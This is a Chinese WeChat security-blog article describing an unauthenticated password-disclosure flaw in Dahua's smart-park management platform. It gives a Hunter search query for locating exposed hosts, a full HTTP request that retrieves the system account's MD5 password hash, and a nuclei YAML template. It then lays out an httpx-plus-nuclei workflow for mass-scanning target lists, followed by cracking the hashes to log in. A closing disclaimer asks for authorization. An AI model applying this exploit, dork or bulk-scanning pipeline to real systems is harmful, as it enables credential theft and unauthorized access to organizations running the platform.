#  httpx+nuclei实战 | 大华智慧园区综合管理平台任意密码读取漏洞

原创 zkaq-守法好青年  [ 掌控安全EDU ](javascript:void\(0\);)

**掌控安全EDU** ![]()

微信号 ZKAQEDU

功能介绍 安全教程\高质量文章\面试经验分享，尽在#掌控安全EDU#

____

___发表于_

收录于合集

免费&进群

![]()  ![]()  
本文由掌控安全学院 -  守法好青年   投稿

#### 漏洞成因

没有对接口进行严格的权限管理，导致可以通过访问user_getUserInfoByUserName.action获取system用户的MD5加密后的密码

#### hunter语法

`web.icon="4644f2d45601037b8423d45e13194c93"&&web.title="智慧园区综合管理平台"`

#### POC

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1Host: xxxxxxxxxCookie: JSESSIONID=D99F6DAEA7EC0695266E95A1B1A529CCCache-Control: max-age=0Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9X-Forwarded-For: 127.0.0.1Connection: close

编写.yam文件  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    id: dahuainfo:  name: Template Name  author: wuwen  severity: info  description: description  reference:    - https://  tags: tagsrequests:  - raw:      - |+        GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1        Host: {{Hostname}}        Cookie: JSESSIONID=D99F6DAEA7EC0695266E95A1B1A529CC        Cache-Control: max-age=0        Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"        Sec-Ch-Ua-Mobile: ?0        Sec-Ch-Ua-Platform: "Windows"        Upgrade-Insecure-Requests: 1        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7        Sec-Fetch-Site: none        Sec-Fetch-Mode: navigate        Sec-Fetch-User: ?1        Sec-Fetch-Dest: document        Accept-Encoding: gzip, deflate        Accept-Language: zh-CN,zh;q=0.9        X-Forwarded-For: 127.0.0.1        Connection: close    matchers-condition: and    matchers:      - type: word        part: body        words:          - loginPass      - type: status        status:          - 200

拼接POC访问之后就是这样  

#### ![]()  

再将里面的loginpass字段的内容进行MD5解密

![]()  
试了一下，很多就算用了付费的MD5解密也解不开[跟密码复杂程度有关]，当然也有解得开的，然后输入账号/密码，就可以登录了

![]()

#### 速刷技巧

前两天听了月佬的课，知道了httpx和nuclei联动的强大，所以一起写在这里

##### httpx和nuclei的下载链接

    
          1. https://github.com/projectdiscovery/httpx/releases
    
      2. https://github.com/projectdiscovery/nuclei/releases
    
      3. burp插件，写nuclei的.yaml文件的
    
      4. https://github.com/projectdiscovery/nuclei-burp-plugin/releases
    
    
    

##### 使用方法

首先使用httpx探测存活的目标,我使用的是windows

    
          1. httpx.exe -l url.txt -mc 200 >> survival.txt
    
      2. 就是探测url.txt中的存活的地址（响应码为200） 存到当前目录的survival.txt中
    
    
    

然后使用burp抓取数据包（攻击成功的），选择部分返回包里的内容，使用插件nuclei

![]()  
保存文件，应该是.yaml后缀的

![]()

最后就是使用nuclei了

    
          1. nuclei.exe -l survival.txt -t poc.yaml
    
    
    

如果成功的话就是这样（注意文件路径，如果不确定，就把文件拉进去用绝对路径）  
![]()

最后一定要去验证一下漏洞是否真的存在，然后再提交，通过这种联动，就可以批量打漏洞了。

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![]()  

 **没看够~？欢迎关注！**

 **  
**

 **分享本文到朋友圈，可以凭截图找老师领取**

上千 **教程+工具+交流群+靶场账号** 哦



![]()

 ** ** **分享后扫码 加我！**

  

 **回顾往期内容**

[Xray挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 |
这个CNVD证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

## [    代理池工具撰写 |
只有无尽的跳转，没有封禁的IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)

![]()

点赞+在看支持一下吧~感谢看官老爷~

你的点赞是我更新的动力

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

